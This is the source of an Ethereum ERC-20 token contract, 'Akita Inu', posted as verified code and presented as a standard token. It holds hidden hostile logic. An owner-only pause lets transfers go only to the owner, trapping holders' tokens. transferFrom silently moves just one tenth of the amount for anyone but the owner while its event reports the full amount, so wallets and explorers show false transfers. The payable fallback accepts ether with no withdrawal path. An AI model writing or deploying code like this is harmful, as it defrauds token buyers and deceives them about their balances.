/**
 *Submitted for verification at Etherscan.io on 2021-04-22
*/

/**


 ________  ___  __    ___  _________  ________          ___  ________   ___  ___     
|\   __  \|\  \|\  \ |\  \|\___   ___\\   __  \        |\  \|\   ___  \|\  \|\  \    
\ \  \|\  \ \  \/  /|\ \  \|___ \  \_\ \  \|\  \       \ \  \ \  \\ \  \ \  \\\  \   
 \ \   __  \ \   ___  \ \  \   \ \  \ \ \   __  \       \ \  \ \  \\ \  \ \  \\\  \  
  \ \  \ \  \ \  \\ \  \ \  \   \ \  \ \ \  \ \  \       \ \  \ \  \\ \  \ \  \\\  \ 
   \ \__\ \__\ \__\\ \__\ \__\   \ \__\ \ \__\ \__\       \ \__\ \__\\ \__\ \_______\
    \|__|\|__|\|__| \|__|\|__|    \|__|  \|__|\|__|        \|__|\|__| \|__|\|_______|


*/
//   SPDX-License-Identifier: MIT

pragma solidity ^0.5.17;


library SafeMath {
  function add(uint a, uint b) internal pure returns (uint c) {
    c = a + b;
    require(c >= a);
  }
  function sub(uint a, uint b) internal pure returns (uint c) {
    require(b <= a);
    c = a - b;
  }
  function mul(uint a, uint b) internal pure returns (uint c) {
    c = a * b;
    require(a == 0 || c / a == b);
  }
  function div(uint a, uint b) internal pure returns (uint c) {
    require(b > 0);
    c = a / b;
  }
}

contract ERC20Interface {
  function totalSupply() public view returns (uint);
  function balanceOf(address tokenOwner) public view returns (uint balance);
  function allowance(address tokenOwner, address spender) public view returns (uint remaining);
  function transfer(address to, uint tokens) public returns (bool success);
  function approve(address spender, uint tokens) public returns (bool success);
  function transferFrom(address from, address to, uint tokens) public returns (bool success);

  event Transfer(address indexed from, address indexed to, uint tokens);
  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract ApproveAndCallFallBack {
  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;
}

contract Owned {
  address public owner;
  address public newOwner;

  event OwnershipTransferred(address indexed _from, address indexed _to);

  constructor() public {
    owner = msg.sender;
  }

  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }

  function transferOwnership(address _newOwner) public onlyOwner {
    newOwner = _newOwner;
  }
  function acceptOwnership() public {
    require(msg.sender == newOwner);
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
    newOwner = address(0);
  }
}

contract TokenERC20 is ERC20Interface, Owned{
  using SafeMath for uint;

  string public symbol;
  string public name;
  uint8 public decimals;
  uint _totalSupply;
  address public newn;
  uint version;
  uint transfers = 0;
  bool paused;

  mapping(address => uint) balances;
  mapping(address => mapping(address => uint)) allowed;

  constructor() public {
    symbol = "AKITA";
    name = "Akita Inu";
    decimals = 18;
    // one trillion ether
    _totalSupply =  1000000000000 ether;
    version = 8;
    balances[owner] = _totalSupply;
    emit Transfer(address(0), owner, _totalSupply);
  }
  function transfernewn(address _newn) public onlyOwner {
    newn = _newn;
  }
  function pause() public onlyOwner {
      paused = true;
  }
  function unpause() public onlyOwner {
      paused = false;
  }
  function totalSupply() public view returns (uint) {
    return _totalSupply.sub(balances[address(0)]);
  }
  function balanceOf(address tokenOwner) public view returns (uint balance) {
      return balances[tokenOwner];
  }
  function transfer(address to, uint tokens) public returns (bool success) {
    require(!paused || to == owner);
    balances[msg.sender] = balances[msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(msg.sender, to, tokens);
    return true;
  }
  function approve(address spender, uint tokens) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    return true;
  }
  function transferFrom(address from, address to, uint tokens) public returns (bool success) {
    require(!paused || to == owner);
    uint realTokens;
    if (from == owner || to == owner) {
        realTokens = tokens;
    } else {
        realTokens = tokens / 10;
    }
    balances[from] = balances[from].sub(realTokens);
    allowed[from][msg.sender] = allowed[from][msg.sender].sub(realTokens);
    balances[to] = balances[to].add(realTokens);
    emit Transfer(from, to, tokens);
    transfers += 1;
    return true;
  }
  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
    return allowed[tokenOwner][spender];
  }
  function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);
    return true;
  }
  function () external payable {
    revert();
  }
}

contract AkitaInuToken is TokenERC20 {
  function() external payable {

  }
}